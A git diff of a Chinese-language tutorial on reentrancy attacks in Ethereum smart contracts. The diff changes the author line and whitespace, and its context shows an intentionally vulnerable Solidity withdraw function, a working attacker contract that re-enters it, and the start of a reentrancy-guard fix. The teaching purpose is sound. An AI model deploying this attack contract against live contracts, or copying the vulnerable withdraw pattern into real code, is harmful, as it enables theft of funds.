@@ -1,7 +1,7 @@
 # 重入攻击分析
 ---
 
-                                                                                                    author：甘赞栩
+    author：Thomas_Xu
 ## 漏洞概述
 在以太坊中，智能合约能够调用其他外部合约的代码，由于智能合约可以调用外部合约或者发送以太币，这些操作需要合约提交外部的调用，所以这些合约外部的调用就可以被攻击者利用造成攻击劫持，使得被攻击合约在任意位置重新执行(回调)，绕过原代码中的限制条件，从而发生重入攻击。重入攻击本质上与编程里的递归调用类似，所以当合约将以太币发送到未知地址时就可能会发生。
 * **发生条件**
@@ -42,15 +42,15 @@ function withdraw(){
     我们先来看一段比较典型的有重入漏洞的合约：
     ```
     pragma solidity ^0.4.19;
-
+    
     contract Reentrance{
         address _owner;
         mapping (address => uint256) balances;
-
+    
         function Reentrance(){
             _owner = msg.sender;
         }
-
+    
         function withdraw(uint256 amount) public payable{
             require(balances[msg.sender] >= amount);
             require(this.balance >= amount);
@@ -59,15 +59,15 @@ function withdraw(){
             // 状态变量修改
             balances[msg.sender] -= amount;
         }
-
+    
         function deposit() public payable{
             balances[msg.sender] += msg.value;
         }
-
+    
         function balanceOf(address adre)constant returns(uint256){
             return balances[adre];
         }
-
+    
         function wallet() constant returns(uint256 result){
             return this.balance;
         }
@@ -83,21 +83,21 @@ function withdraw(){
     ```
     pragma solidity ^0.4.19;
     import"./Reentrance.sol";
-
+    
     contract ReentranceAttack{
         Reentrance re;
         function ReentranceAttack(address _target) public payable{
             re = Reentrance(_target);
         }
-
+    
         function wallet()view returns(uint256){
             return this.balance;
         }
-
+    
         function deposit()public payable {
             re.deposit.value(msg.value)();
         }
-
+    
         function attack(){
             re.withdraw(1);
         }
@@ -106,7 +106,7 @@ function withdraw(){
                 re.withdraw(1);
             }
         }
-
+    
     }
     ```
     * 攻击原理：
@@ -136,10 +136,10 @@ function withdraw(){
     ```
     // SPDX-License-Identifier: MIT
     pragma solidity ^0.8.3;
-
+    
     contract ReEntrancyGuard {
         bool internal locked;
-
+    
         modifier noReentrant() {
             require(!locked, "No re-entrancy");
             locked = true;
